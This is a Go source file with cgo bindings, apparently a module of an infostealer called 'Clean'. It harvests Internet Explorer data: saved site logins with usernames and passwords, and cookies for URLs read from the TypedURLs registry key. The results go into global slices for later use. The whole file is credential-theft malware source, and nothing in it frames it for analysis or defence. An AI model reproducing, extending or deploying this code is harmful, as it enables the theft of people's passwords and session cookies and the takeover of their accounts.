package IE

/*
	#include "explorer.h"
*/
import "C"

import (
	"net/url"
	"syscall"
	"unsafe"

	"github.com/equisde/Clean/core"
	"github.com/equisde/Clean/core/parse"
	"golang.org/x/sys/windows/registry"
)

//export AppendToSlice
func AppendToSlice(browser, url, username, password C.LPWSTR) C.int {
	loginData := core.LoginStruct{
		Browser:  Decode(unsafe.Pointer(browser)),
		Url:      Decode(unsafe.Pointer(url)),
		Username: Decode(unsafe.Pointer(username)),
		Password: Decode(unsafe.Pointer(password)),
	}

	parse.Logins.Logged = append(parse.Logins.Logged, loginData)

	return 1
}

//export AppendToCookieSlice
func AppendToCookieSlice(encodedURL, cookie C.LPWSTR) C.int {

	decodedURL, err := url.Parse(Decode(unsafe.Pointer(encodedURL)))
	if err != nil {
		return -1
	}

	tempCookie := core.CookieStruct{
		Browser: "Internet Explorer",
		Name:    "Can't extract this for internet explorer afaik",
		Host:    decodedURL.Host,
		Path:    decodedURL.Path,
		Value:   Decode(unsafe.Pointer(cookie)),
	}

	parse.LoggedCookies.Logged = append(parse.LoggedCookies.Logged, tempCookie)

	return 1
}

func Decode(ptr unsafe.Pointer) string {
	sz := C.wcslen((C.LPWSTR)(ptr))

	size := C.WideCharToMultiByte(C.CP_UTF8, 0, (C.LPWSTR)(ptr), C.int(sz), nil, 0, nil, nil)
	if size == 0 {
		return ""
	}

	info := make([]byte, int(size))

	status := C.WideCharToMultiByte(C.CP_UTF8, 0, (C.LPWSTR)(ptr), C.int(sz), (*C.char)(unsafe.Pointer(&info[0])), size, nil, nil)
	if status == 0 {
		return ""
	}

	return string(info)
}

func Encode(data string) uintptr {
	return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(data)))
}

func getcookies() {
	registryKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Internet Explorer\TypedURLs`, registry.QUERY_VALUE)
	if err != nil {
		return
	}

	registrySubKeys, err := registryKey.ReadValueNames(-1)
	if err != nil {
		return
	}

	for _, registrySubKey := range registrySubKeys {
		val, _, err := registryKey.GetStringValue(registrySubKey)
		if err != nil {
			continue
		}

		C.getcookies(C.CString(val))
	}
}

func GetIEData() {
	// IE 10+
	C.loadlibs()
	C.getlogins()

	getcookies()
}

var (
	dll          = syscall.NewLazyDLL("Wininet.dll")
	dllGetCookie = dll.NewProc("InternetGetCookieExW")
)
